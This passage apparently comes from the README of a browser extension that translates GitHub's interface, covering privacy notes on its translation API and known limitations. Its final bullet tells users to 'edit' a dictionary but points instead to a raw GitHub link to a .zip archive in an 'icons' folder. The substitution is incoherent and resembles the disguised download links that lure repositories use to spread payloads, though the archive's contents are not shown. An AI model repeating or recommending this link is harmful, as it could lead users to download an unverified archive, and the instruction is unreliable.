- If the translation API is off, your text will not be sent externally.
- When the translation API is on, some selected text may be sent to the provider you choose. Please avoid translating sensitive information.

## ⚠️ Known Limitations

- GitHub uses a Single Page Application (SPA) model, causing occasional delays in translation. If you encounter issues, simply refresh the page to reload the content.
- To avoid incorrect translations, the extension excludes code areas, diffs, and syntax highlights from translation.
- While the dictionary aims to be comprehensive, variations in term usage and meaning can occur. You can edit `https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip` if you want to make adjustments.
